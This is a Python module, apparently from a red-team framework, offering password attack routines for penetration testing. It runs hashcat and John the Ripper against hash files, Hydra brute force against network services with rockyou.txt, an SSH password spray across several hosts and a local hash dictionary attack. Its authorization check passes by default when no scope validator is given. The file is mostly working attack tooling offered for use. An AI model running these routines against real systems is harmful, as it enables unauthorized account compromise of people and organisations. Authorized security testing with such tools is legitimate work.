"""RED TEAM - Password Attacks
AUTHORIZED USE ONLY - For penetration testing in controlled lab environments
"""
import logging
import subprocess
import hashlib
from typing import Dict, List, Optional, Any
from pathlib import Path

logger = logging.getLogger("PROMETHEUS-PRIME.RedTeam.PasswordAttacks")

class PasswordAttacks:
    """Password attack techniques for authorized penetration testing"""

    def __init__(self, scope_validator=None, authorization_required=True):
        self.logger = logger
        self.authorization_required = authorization_required
        self.scope_validator = scope_validator
        self.logger.info("PasswordAttacks module initialized - AUTHORIZED PENTESTING ONLY")

    def _check_authorization(self, target: str, method: str) -> bool:
        if not self.authorization_required:
            return True
        if self.scope_validator:
            authorized = self.scope_validator.validate(target, method)
            if not authorized:
                raise PermissionError(f"Target {target} not in authorized scope")
            return True
        self.logger.warning("No scope validator - assuming authorized")
        return True

    def hashcat_crack(self, hash_file: str, wordlist: str, hash_type: str = "0",
                     attack_mode: int = 0) -> Dict[str, Any]:
        """Crack password hashes using Hashcat"""
        self._check_authorization("localhost", "hashcat")
        try:
            cmd = ["hashcat", "-m", hash_type, "-a", str(attack_mode), hash_file, wordlist, "--force"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {
                "method": "hashcat",
                "status": "complete" if proc.returncode == 0 else "failed",
                "hash_type": hash_type,
                "attack_mode": attack_mode,
                "output": proc.stdout[:1000]
            }
        except Exception as e:
            return {"method": "hashcat", "status": "failed", "error": str(e)}

    def john_crack(self, hash_file: str, wordlist: str = None) -> Dict[str, Any]:
        """Crack passwords using John the Ripper"""
        self._check_authorization("localhost", "john")
        try:
            cmd = ["john", hash_file]
            if wordlist:
                cmd.extend(["--wordlist", wordlist])
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {
                "method": "john_the_ripper",
                "status": "complete",
                "output": proc.stdout[:1000]
            }
        except Exception as e:
            return {"method": "john", "status": "failed", "error": str(e)}

    def hydra_brute(self, target: str, service: str, username: str = None,
                   userlist: str = None, passlist: str = None) -> Dict[str, Any]:
        """Brute force using Hydra"""
        self._check_authorization(target, "hydra_brute")
        try:
            cmd = ["hydra", "-l", username or "admin", "-P", passlist or "/usr/share/wordlists/rockyou.txt",
                   service + "://" + target]
            if userlist:
                cmd = ["hydra", "-L", userlist, "-P", passlist, service + "://" + target]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {
                "method": "hydra_brute",
                "status": "complete",
                "target": target,
                "service": service,
                "output": proc.stdout[:1000]
            }
        except Exception as e:
            return {"method": "hydra", "status": "failed", "error": str(e)}

    def password_spray(self, targets: List[str], username: str, password: str,
                      service: str = "ssh") -> Dict[str, Any]:
        """Password spraying attack across multiple targets"""
        self._check_authorization(targets[0] if targets else "unknown", "password_spray")
        results = []
        for target in targets[:10]:  # Limit to 10 targets
            try:
                if service == "ssh":
                    import paramiko
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, username=username, password=password, timeout=5)
                    results.append({"target": target, "status": "success"})
                    client.close()
                else:
                    results.append({"target": target, "status": "unsupported_service"})
            except:
                results.append({"target": target, "status": "failed"})
        return {
            "method": "password_spray",
            "username": username,
            "service": service,
            "targets_tested": len(results),
            "successful": sum(1 for r in results if r["status"] == "success"),
            "results": results
        }

    def dictionary_attack(self, target_hash: str, wordlist: str, hash_type: str = "md5") -> Dict[str, Any]:
        """Simple dictionary attack"""
        self._check_authorization("localhost", "dictionary")
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                for i, password in enumerate(f):
                    password = password.strip()
                    if hash_type == "md5":
                        test_hash = hashlib.md5(password.encode()).hexdigest()
                    elif hash_type == "sha1":
                        test_hash = hashlib.sha1(password.encode()).hexdigest()
                    elif hash_type == "sha256":
                        test_hash = hashlib.sha256(password.encode()).hexdigest()
                    else:
                        test_hash = None

                    if test_hash == target_hash:
                        return {
                            "method": "dictionary_attack",
                            "status": "cracked",
                            "password": password,
                            "attempts": i + 1
                        }
                    if i > 100000:  # Limit attempts
                        break
            return {"method": "dictionary_attack", "status": "not_found"}
        except Exception as e:
            return {"method": "dictionary", "status": "failed", "error": str(e)}

    def get_capabilities(self) -> List[str]:
        return ["hashcat_crack", "john_crack", "hydra_brute", "password_spray", "dictionary_attack"]

__all__ = ["PasswordAttacks"]
